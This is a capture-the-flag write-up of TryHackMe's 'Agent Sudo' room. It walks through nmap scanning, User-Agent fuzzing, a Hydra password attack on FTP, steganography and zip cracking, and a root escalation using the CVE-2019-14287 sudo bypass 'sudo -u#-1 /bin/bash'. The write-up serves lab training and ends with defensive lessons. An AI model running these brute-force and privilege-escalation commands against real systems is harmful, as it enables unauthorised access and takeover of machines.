TryHackMe: Agent Sudo - CTF Write-Up

Platform: TryHackMe

Room: Agent Sudo

Difficulty: Easy

Category: CTF / Enumeration / Steganography / Privilege Escalation


🚀 Executive Summary

This write-up documents the solution for the "Agent Sudo" room on TryHackMe. The challenge involves a multi-staged approach starting with network enumeration, followed by web traffic manipulation (User-Agent spoofing), brute-forcing protocols, complex steganography analysis, and finally exploiting a specific sudo vulnerability (CVE-2019-14287) to escalate privileges to root.
1. Enumeration

I started by scanning the target machine to identify open ports and running services using Nmap.

Command:
Bash

nmap -sC -sV -T4 <TARGET_IP>

    -sC: Runs default scripts.

    -sV: Detects service versions.

    -T4: Increases scan speed.

Results:

    Port 21 (FTP): vsftpd 3.0.3

    Port 22 (SSH): OpenSSH 7.6p1

    Port 80 (HTTP): Apache httpd 2.4.29

2. Web Exploitation

Upon visiting the web server on port 80, I encountered a message: "Use your own codename as user-agent to access the site." The message was signed by "Agent R".
Methodology

The clue suggested that the server filters access based on the User-Agent HTTP header. Since the signature was a single letter ("R"), I inferred that valid codenames are single characters.

I used Burp Suite (Repeater/Intruder) to intercept the request and fuzz the User-Agent header with single letters (A, B, C...).

Exploitation: When I set the header to User-Agent: C, the server redirected me to agent_C_attention.php. The response contained a message addressed to "Chris", revealing a valid username.


3. Gaining Access

With the username chris and an open FTP port, I decided to perform a dictionary attack using Hydra.

Command:
Bash

hydra -l chris -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ftp

Result: Hydra successfully cracked the password: crystal. I logged into the FTP server and downloaded two files: To_agentJ.txt and cutie.png.
4. Steganography & Forensics

The downloaded image (cutie.png) appeared normal, but the context of the room suggested hidden data.
Step A: Extracting Hidden Files (Binwalk)

I used binwalk to check for embedded files.
Bash

binwalk -e cutie.png

This extracted a password-protected ZIP file hidden within the image bytes.
Step B: Cracking the Zip Password

To open the zip, I converted it to a hash format using zip2john and cracked it with John the Ripper.
Bash

zip2john 8702.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Found Password: alien
Step C: Decoding the Message

Inside the zip, I found a text file containing a Base64 encoded string: QXJlYTUx.
Bash

echo "QXJlYTUx" | base64 -d

Decoded Output: Area51
Step D: Steghide Extraction

Suspecting more hidden data, I used steghide on the original image. Although the file extension was .png, the tool (or zsteg) revealed hidden text. I used the decoded string Area51 (or sometimes the filename logic) to extract the data.

The extracted message revealed the SSH password for Agent J (James): hackerrules!
5. Privilege Escalation

I logged in via SSH using the credentials james : hackerrules!. After capturing the user flag, I checked for sudo privileges:
Bash

sudo -l

Output:

(ALL, !root) /bin/bash

Vulnerability Analysis (CVE-2019-14287)

The output indicates that the user james can execute /bin/bash as ANY user except root. This is a classic misconfiguration related to CVE-2019-14287.

In Sudo versions prior to 1.8.28, passing a User ID (UID) of -1 or 4294967295 causes the system to treat the user as ID 0 (Root), bypassing the explicit "!root" restriction due to an integer overflow issue.
Exploitation

I executed the following command to bypass the restriction and spawn a root shell:
Bash

sudo -u#-1 /bin/bash

Result: I successfully obtained root access and captured the final flag.


🔑 Key Takeaways

    Security by Obscurity Fails: Relying on User-Agent headers for authentication is insecure and easily bypassed.

    Steganography Layers: Sensitive data can be hidden in multiple layers (e.g., a zip file inside an image, and a text file inside the same image using different tools).

    Sudo Misconfigurations: The specific syntax (ALL, !root) is dangerous in older sudo versions and can be trivially exploited using the UID -1 trick.

Happy Hacking!
